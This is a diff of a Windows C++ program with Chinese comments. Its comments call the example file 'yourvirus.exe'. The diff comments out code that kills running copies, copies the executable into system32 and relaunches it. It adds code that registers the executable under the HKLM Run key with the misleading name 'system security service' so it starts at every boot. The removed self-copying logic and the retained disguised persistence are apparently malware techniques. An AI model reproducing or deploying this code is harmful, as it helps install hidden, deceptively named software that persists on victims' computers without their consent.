@@ -6,53 +6,51 @@
 // 写入注册表更改开机启动
 string WriteRegistry()
 {
-	char sysPath[MAX_PATH]; // 系统路径
+	//char sysPath[MAX_PATH]; // 系统路径
 	char filePath[MAX_PATH]; // 运行的文件的完整路径
 	HMODULE modH = GetModuleHandle(NULL);
 	GetModuleFileName(modH, filePath, sizeof(filePath)); // 得到当前执行文件的全路径
 
 	//得到系统文件所在目录的路径，如c:\windows\system32
-	GetSystemDirectory(sysPath,sizeof(sysPath));
+	//GetSystemDirectory(sysPath,sizeof(sysPath));
 
 	//形成要复制到的全路径，如c:\windows\system32\yourvirus.exe
-	strcat_s(sysPath, "\\");
-	strcat_s(sysPath, NEW_FILE);
+	//strcat_s(sysPath, "\\");
+	//strcat_s(sysPath, NEW_FILE);
 	// 转化为小写比较
-	size_t i;
-	for (i = 0; i < strlen(filePath); ++i)
-	{
-		filePath[i] = tolower(filePath[i]);
-	}
-	for (i = 0; i < strlen(sysPath); ++i)
-	{
-		sysPath[i] = tolower(sysPath[i]);
-	}
+	//size_t i;
+	//for (i = 0; i < strlen(filePath); ++i)
+	//{
+	//	filePath[i] = tolower(filePath[i]);
+	//}
+	//for (i = 0; i < strlen(sysPath); ++i)
+	//{
+	//	sysPath[i] = tolower(sysPath[i]);
+	//}
 	// 如果不是自己在运行
-	if (strcmp(filePath, sysPath) != 0)
-	{
-		char cmd[MAX_PATH]={0};
-		sprintf_s(cmd, "taskkill /f /im %s", NEW_FILE);
-		system(cmd);
-		//自我复制到目标路径并覆盖存在文件
-		CopyFile(filePath, sysPath, false);
-		Sleep(3000);
-		//system(sysPath);
-		ShellExecute(NULL,"open", sysPath, NULL, NULL, SW_SHOWNORMAL);
-		//WinExec(sysPath, SW_SHOWNORMAL);
-		return "exit";
-	}
-	else
-	{
-		HKEY hKey; // 写入到注册表，以便开机自动运行
-		// 打开注册表：路径如下HEKY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
-		RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
-		// 新增一个值，名称随意命名，值为要开机运行的文件的完整路径
-		RegSetValueEx(hKey, "系统安全服务", 0, REG_SZ, (const unsigned char*)sysPath, sizeof(sysPath));
-		RegCloseKey(hKey); // 关闭注册表
-		_tcsrchr(sysPath, _T('\\'))[0] = 0;
-		return sysPath;
-	}
-	return sysPath;
+	//if (strcmp(filePath, sysPath) != 0)
+	//{
+	//	char cmd[MAX_PATH]={0};
+	//	sprintf_s(cmd, "taskkill /f /im %s", NEW_FILE);
+	//	system(cmd);
+	//	//自我复制到目标路径并覆盖存在文件
+	//	CopyFile(filePath, sysPath, false);
+	//	Sleep(3000);
+	//	//system(sysPath);
+	//	ShellExecute(NULL,"open", sysPath, NULL, NULL, SW_SHOWNORMAL);
+	//	//WinExec(sysPath, SW_SHOWNORMAL);
+	//	return "exit";
+	//}
+	//else
+
+	HKEY hKey; // 写入到注册表，以便开机自动运行
+	// 打开注册表：路径如下HEKY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
+	RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
+	// 新增一个值，名称随意命名，值为要开机运行的文件的完整路径
+	RegSetValueEx(hKey, "系统安全服务", 0, REG_SZ, (const unsigned char*)filePath, sizeof(filePath));
+	RegCloseKey(hKey); // 关闭注册表
+	_tcsrchr(filePath, _T('\\'))[0] = 0;
+	return filePath;
 }
 
 // 获取当前鼠标位置的窗口句柄
@@ -367,10 +365,10 @@ bool IsTickOff()
 int main(int argc, _TCHAR* argv[])
 {
 	string path =  WriteRegistry(); // 写入开始运行并判断路径
-	if (path == "exit")
-	{
-		return 0; // 程序结束
-	}
+	//if (path == "exit")
+	//{
+	//	return 0; // 程序结束
+	//}
 	// 设置中断控制，检测关机退出等
 	if (!SetConsoleCtrlHandler( (PHANDLER_ROUTINE)ConsoleHandler, TRUE))
 	{
